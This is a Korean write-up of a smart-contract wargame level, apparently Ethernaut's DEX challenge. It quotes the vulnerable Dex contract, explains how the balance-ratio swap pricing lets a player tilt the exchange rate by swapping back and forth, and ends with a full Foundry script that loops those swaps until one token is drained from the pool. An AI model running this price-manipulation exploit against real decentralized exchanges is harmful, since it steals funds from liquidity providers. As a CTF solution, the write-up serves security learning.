# 지문

이 레벨의 목표는 기본적인 DEX 컨트랙트를 해킹하여 **가격 조작을 통해 자금을 탈취하는 것**입니다.

당신은 **token1 10개와 token2 10개**를 가지고 시작합니다. DEX 컨트랙트는 각각 **100개의 토큰**을 보유한 상태로 시작합니다.

이 레벨에서 성공하려면 두 토큰 중 적어도 하나를 전부 고갈시켜야 하며, 동시에 컨트랙트가 자산의 "잘못된(bad)" 가격을 보고하도록 만들어야 합니다.

---

### 참고 사항

보통 ERC20 토큰으로 스왑을 할 때는, 컨트랙트가 당신의 토큰을 대신 사용할 수 있도록 **approve**를 먼저 해줘야 합니다.
이 게임의 문법을 단순하게 유지하기 위해, **approve 메서드를 DEX 컨트랙트 안에 추가**해 두었습니다. 따라서 직접 토큰 컨트랙트에 approve를 호출할 필요 없이, 다음과 같이 호출할 수 있습니다:

```
contract.approve(contract.address, <uint amount>)
```

이렇게 하면 지정한 수량만큼 두 토큰의 사용 권한이 자동으로 승인됩니다.
SwappableToken 컨트랙트는 무시해도 괜찮습니다.

---

### 도움이 될 만한 것들

* 토큰의 가격은 **어떻게 계산되는가?**
* `swap` 메서드는 **어떻게 동작하는가?**
* ERC20에서 **트랜잭션을 승인(approve)** 하는 방법은?
* 컨트랙트와 상호작용하는 방법은 **여러 가지**가 있다!
* **Remix**가 도움이 될 수도 있다
* "At Address"는 무슨 의미일까?


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

# 풀이 

문제를 보면 swap에 대해서 취약점이 발생한다.

contract는 token1을 100개, token2를 100개가 갖고있다.

player에게는 token1이 10개, token2가 10개 주어진다.

player가 token1 10개를 token2로 몽땅 바꾼다고 치자.

그럼 상황은 다음과 같을 것이다

contract token1 - 110, token2 - 90

player token1 - 0, token2 - 20

여기서 token2 20개를 token1로 모두 스왑한다고 칠 때 스왑하는 양에 대해서 계산하는 Get_swap_price에 대해서 체크해보자

get_swap_price(token2 address, token1 address, 10) 일 때 수식에 값을 대입해보면 다음과 같은 값이 반환될 것이다

(20*110)/90 = 24

그리고 그 값대로 스왑 함수를 호출하면 유저에게 토큰을 전송할것이다.

자, 이렇게되서 처음에는 교환비 1:1이었던 token1,2의 교환비가 점점 한쪽으로 쏠리게된다.

이것을 token1↔token2에서 다수 반복하면 토큰 하나를 완전히 훔칠 수 있다

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ITarget {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;

    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract SolveScript is Script {
    address public target = 0xfBD745797A0fb50429f0a2b04581092798Fdf30B;
    address public player = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address token1 = ITarget(target).token1();
        address token2 = ITarget(target).token2();

        // approve dex to spend our tokens
        IERC20(token1).approve(target, type(uint256).max);
        IERC20(token2).approve(target, type(uint256).max);

        console.log("=== Initial Balances ===");
        logBalances(token1, token2);

        bool toggle = true; // true = token1->token2, false = token2->token1
        uint256 amount;

        while (
            IERC20(token1).balanceOf(target) > 0 &&
            IERC20(token2).balanceOf(target) > 0
        ) {
            address from = toggle ? token1 : token2;
            address to   = toggle ? token2 : token1;

            uint256 userBal = IERC20(from).balanceOf(player);
            if (userBal == 0) break;

            uint256 dexBalTo = IERC20(to).balanceOf(target);
            uint256 outAmt = ITarget(target).getSwapPrice(from, to, userBal);

            if (outAmt > dexBalTo) {
                userBal = (userBal * dexBalTo) / outAmt;
            }

            console.log("Swapping %d %s -> %s", userBal, from, to);
            ITarget(target).swap(from, to, userBal);

            toggle = !toggle;
            logBalances(token1, token2);
        }

        console.log("=== Final Balances ===");
        logBalances(token1, token2);

        vm.stopBroadcast();
    }

    function logBalances(address token1, address token2) internal view {
        console.log("my token1 balance : %d", IERC20(token1).balanceOf(player));
        console.log("my token2 balance : %d", IERC20(token2).balanceOf(player));
        console.log("dex token1 balance : %d", IERC20(token1).balanceOf(target));
        console.log("dex token2 balance : %d", IERC20(token2).balanceOf(target));
    }
}

```